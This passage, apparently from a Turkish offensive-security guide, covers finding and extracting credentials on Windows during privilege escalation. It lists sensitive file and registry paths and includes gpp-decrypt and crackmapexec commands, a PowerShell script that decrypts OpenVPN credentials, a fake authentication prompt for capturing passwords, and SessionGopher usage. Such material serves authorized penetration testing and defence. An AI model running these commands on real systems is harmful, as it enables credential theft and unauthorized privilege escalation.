### Java server plugin arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java server plugin'leri, server'ın `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir özel bir plugin, gömülü bir service kimlik bilgisi içeren yapılandırma veya bytecode barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan sırları rutin enumerasyon çıktısına eklemeyin. Bir plugin yolu tek başına sır bulunduğunu kanıtlamaz; kurtarılan bir service parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklar sağlar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı sırlarla değiştirin. Dizin düzeni için [PaperMC'nin plugin kurulum kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanını kullanan bir Openfire kurulumu, `Openfire\embedded-db` altında `openfire.script` dosyasını tutabilir. Mevcut hesap dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [user-provider belgelerinde](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) parolaların düz metin olarak saklanabileceği veya bu özellikte tutulan bir anahtarla şifrelenebileceği belirtilir. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne okuma erişimini ne de kimlik bilgilerinin yeniden kullanıldığını kanıtlar. Bu yol bir envanter ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin enumerasyon çıktısına eklemeyin.

Ayrı `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile admin console için yapılandırılmış portları ve bind interface'i açığa çıkarabilir. Openfire genellikle admin console'u loopback'e bağlar; listener çalışıyorsa yerel bir hesap yine de bu adrese erişebilir. Gerçek listener'ı, yetkili admin rolünü, plugin yükleme ilkesini ve Openfire service kimliğini birlikte denetleyin. Plugin yükleyebilen bir admin, plugin kodunun service bağlamında çalışmasına neden olabilir; service LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklı olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına admin console erişimini ya da kod yürütmeyi kanıtlamaz. Üreticinin [kurulum ve plugin yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [plugin yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli inceleme yönetim server'ı yapılandırması

Genellikle `server.config.yaml` adını taşıyan Velociraptor server yapılandırmaları, dahili CA'ye ait `CA.private_key` içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa API client sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı, server'ın kullanıcı rollerine, API erişilebilirliğine ve server'ın veya hedef agent'ın çalıştığı kimliğe bağlıdır. Bir client yapılandırması farklı materyal içerir; böyle bir yapılandırmanın bulunması server CA'sine erişim olduğunu göstermez. Bazı kurulumlarda CA private key çevrimdışı tutulur; dolayısıyla okunabilir bir server yapılandırması imzalama anahtarını içermeyebilir.

Bir Windows server'da, kurulum dizinindeki **server** yapılandırmasının ve korumalı yedek kopyalarının ACL'lerini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml`'dır; farklıysa service için yapılandırılmış yolu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten bulunduğunu doğrulayın. Private key'i loglara veya enumerasyon çıktısına yazdırmaktan kaçının. Üreticinin `config api_client` iş akışı, client sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir server-side rol de gerekir. Böyle bir rol oluşturmak veya değiştirmek datastore'a yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir server kimliği bir yol sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili server veya agent bağlamında çalışır ve bu bağlam yüksek ayrıcalıklı olabilir.

Server yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve listener erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifreli deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir; dışa aktarılmış oturum yedeği ise `sessions-backup.dat` olarak adlandırılmış ve başka bir konumda saklanmış olabilir. [SolarWinds'in dışa aktarma kılavuzu](https://thwack.solarwinds.com/discussion/comment/115591), dışa aktarımların parola ile şifrelendiğini ve oturumlar, anahtarlar, betikler, etiketler ve ilişkiler içerebileceğini söylüyor; [destek forumunda](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depo belirtiliyor. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### PuTTY SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH keys

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir, bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturup bunları `ssh-add` ile eklemeyi ve ssh üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'ları da içerebilir. Yerel olarak erişilebilen yedekleme veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı, hive'ların açığa çıktığını kanıtlamaz ve rutin `install.wim`, `boot.wim` ve kurtarma imajları sık karşılaşılan yanıltıcı ipuçlarıdır. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca bu paylaşım kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) belgelerine bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı dosyayı arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Grup İlkesi Tercihleri (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak saklanan Grup İlkesi Nesnelerine (GPO) herhangi bir etki alanı kullanıcısı erişebilirdi. İkinci olarak, AES256 ile şifrelenmiş ve varsayılan anahtarı herkese açık şekilde belgelenmiş olan bu GPP'lerdeki parolalar, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebilirdi. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine yol açabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak amacıyla, boş olmayan bir "cpassword" alanı içeren ve yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda, işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, güvenlik açığının belirlenmesine ve giderilmesine yardımcı olmak için GPP ve dosyanın konumu hakkında ayrıntılar içerir.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ içinde arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları elde etmek için crackmapexec kullanımı:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Yapılandırması

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot içindeki yedek arşivleri

Doğrudan sunulan bir webroot içine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir ifşa olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde bir sır bulunduğunu veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Loglar

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Bunları bilebileceğini düşünüyorsanız, kullanıcıdan **kendi kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Geçmişte **parolaları** **düz metin** veya **Base64** biçiminde içermiş olan bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın varlığı, onu okuyabileceğinizi, kilidini açabileceğinizi veya içinde saklanan kimlik bilgilerini kullanabileceğinizi göstermez. Bu tür dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş kasa için bir ipucudur. Kilidini açmak için asıl ana parola ve yapılandırılmış tüm anahtar dosyası veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) yöntemini değerlendirmeden önce belirtilen hesabı ve NT hash'inin hedefin NTLM hizmeti tarafından hâlâ geçerli ve kabul edilir olup olmadığını doğrulayın. Bir kasa girdisi kendi başına Administrator veya SYSTEM hakları vermez; uzaktan hizmet erişiminin, hesap haklarının ve ayrı bir hizmet yürütme adımının da mevcut olması gerekir. Envanterde veritabanı veya saklanan kimlik bilgileri yerine kasanın yolunu ve okunabilirlik durumunu bildirin.

Önerilen dosyaların tümünde arama yapın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Erişilebilen Geri Dönüşüm Kutusu girdilerinde silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz eden dosyaları kontrol edin. Kullanışlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinmiş dosyayı ise bunun eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce üst verileri ve geçerli kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek bulunmadığını kanıtlamaz. Bir arşiv adını, geçerli bir gizli bilgi içerdiğinin kanıtı olarak değil, incelenmesi gereken bir aday olarak değerlendirin.

Erişilebilen silinmiş bir `.pfx`, **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtarı olan bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için geçerli kimliğin tam olarak ilgili betiği değiştirebilmesi, etkin bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve zamanlanmış bir görevin veya daha yüksek ayrıcalıklı başka bir tüketicinin betiği gerçekten çalıştırması gerekir. Tek başına `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik bu zincirin varlığını kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce üst verileri, ACL'leri, ilkeyi ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine dair ipuçları için erişilebilen mesajlaşma istemcisi profili veritabanlarını, notları ve alınan dosyaları da inceleyin. Bir BitLocker kurtarma dışa aktarımı HTML veya TXT biçiminde, bazen de adı belirli bir yedekleme arşivinin içinde saklanabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa çevrimdışı etki alanı kimlik bilgilerini kurtarmak için, [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi, eşleşen `SYSTEM` kovanı da gerekir. Dosya adları ve kilitli bir birim tek başına kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin bulunduğunu kanıtlamaz.

Birkaç programda kaydedilmiş **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt Defterinin İçinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Kayıt defterinden OpenSSH anahtarlarını çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome, Edge veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve favorilerini de kontrol edin; bazı **parolalar burada** saklanıyor olabilir.

Mevcut kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumunda; `Local State` ise üst dizin olan `User Data` içindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların bulunması yalnızca kimlik bilgisi deposuna dair bir ipucudur: dosyaların okunabilir olduğunu, ilgili kullanıcının DPAPI bağlamına veya yetkili başka bir anahtar materyaline erişilebildiğini ve kayıtlı bir oturum açma bilgisinin daha yüksek ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmak veya şifresi çözülmüş parolaları yazdırmak gerekmez.

Firefox için [Mozilla, bir profilin](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeliyor. Bu dosyaların bulunması yalnızca bir ipucudur: kullanılabilir kimlik bilgileri olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kayıtlı girişlerin bulunup bulunmadığını ve anahtarın bir Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi etki alanı hesabına aitse, bu hesabın etkin grup denetimi haklarını ve grubun [LAPS parola okuma veya şifre çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına yönetici erişim yolunu kanıtlamaz.

Tarayıcılardan parola çıkarmaya yönelik araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Üzerine Yazma**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenlerinin **birbirleriyle iletişim kurmasını** sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **class ID (CLSID) ile tanımlanır** ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla arayüz üzerinden işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu kayıt defterinin CLSID'leri altında, bir **DLL'yi** gösteren bir **varsayılan değer** ve **ThreadingModel** adlı bir değer içeren **InProcServer32** alt kayıt defterini bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilir.

![Tarayıcı Geçmişi - COM DLL Üzerine Yazma: Bu kayıt defterinin CLSID'leri altında, bir DLL'yi gösteren varsayılan bir değer ve bir değer... içeren InProcServer32 alt kayıt defterini bulabilirsiniz.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabilirseniz**, bu DLL farklı bir kullanıcı tarafından çalıştırıldığında **yetki yükseltebilirsiniz**.

Saldırganların kalıcılık mekanizması olarak COM Hijacking'i nasıl kullandığını öğrenmek için:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola arama**

**Dosya içeriklerinde arama yapın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adıyla dosya arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Kayıt defterinde anahtar adlarını ve parolaları arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Şifreleri arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir; bu plugin'i, kurbanın içinde kimlik bilgilerini arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen şifreleri içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden şifreleri çıkarmak için başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri açık metin olarak kaydeden çeşitli araçların **oturumlarını**, **kullanıcı adlarını** ve **şifrelerini** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Bir **SYSTEM olarak çalışan bir sürecin**, **tam erişimle** yeni bir süreç (`OpenProcess()`) açtığını hayal edin. Aynı süreç, **ana sürecin açık tüm handle'larını devralan**, **düşük ayrıcalıklara sahip** yeni bir süreç de oluşturur (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı sürece tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **ayrıcalıklı sürece ait açık handle'ı** alabilir ve **shellcode enjekte edebilirsiniz**.\
Bu zafiyetin **nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için [bu örneği okuyun](leaked-handle-exploitation.md).\
**Farklı izin düzeyleriyle devralınan (yalnızca tam erişim değil) süreç ve thread'lere ait diğer açık handle'ları nasıl test edip kötüye kullanacağınız hakkında daha kapsamlı bir açıklama için bu diğer gönderiyi okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, süreçler arası iletişimi ve veri aktarımını sağlar.

Windows, ilgisiz süreçlerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rolleri **named pipe server** ve **named pipe client** olarak tanımlanan bir istemci/sunucu mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir süreci** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde bu sürecin kimliğine bürünerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Böyle bir saldırıyı gerçekleştirme talimatları için [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) yararlı kılavuzlar bulabilirsiniz.

